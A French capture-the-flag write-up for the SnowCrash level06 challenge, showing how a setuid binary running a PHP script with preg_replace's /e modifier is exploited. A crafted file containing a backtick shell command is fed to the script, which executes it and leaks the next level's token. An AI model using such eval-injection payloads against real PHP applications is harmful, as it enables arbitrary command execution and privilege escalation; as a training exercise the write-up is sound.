# 06 - PHP exploit: entrée utilisateur

- On se connecte en tant que level06.
```
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

```
level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
```


- Un binaire ainsi qu'un script PHP sont présents, le binaire semble exécuter le script PHP.
```
level06@SnowCrash:~$ cat level06.php
```
```php
#!/usr/bin/php
<?php
function y($m) {
        $m = preg_replace("/\./", " x ", $m);
        $m = preg_replace("/@/", " y", $m);
        return $m;
}

function x($y, $z) {
        $a = file_get_contents($y);
        $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
        $a = preg_replace("/\[/", "(", $a);
        $a = preg_replace("/\]/", ")", $a);
        return $a;
}

$r = x($argv[1], $argv[2]); print $r;
?>
```


- Le script effectue des appels à `preg_replace()` pour formater le contenu du fichier qui lui est donné en premier paramètre avant de l'afficher. La ligne qui nous intéresse est la suivante:
>`$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);`


- Cette ligne indique que si le contenu du fichier commence par `[x ` et se termine par `]`, tout ce qui se trouve entre ces limites peut être exécuté en tant que code PHP (en raison du `/e`), du coup:
```
level06@SnowCrash:~$ echo "[x \${\`getflag\`}]" > /tmp/test
```

```
level06@SnowCrash:~$ cat /tmp/test
[x ${`getflag`}]
```

```
level06@SnowCrash:~$ ./level06 /tmp/test
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

```
level06@SnowCrash:~$ su level07
Password:wiok45aaoguiboiki2tuin6ub
level07@SnowCrash:~$
```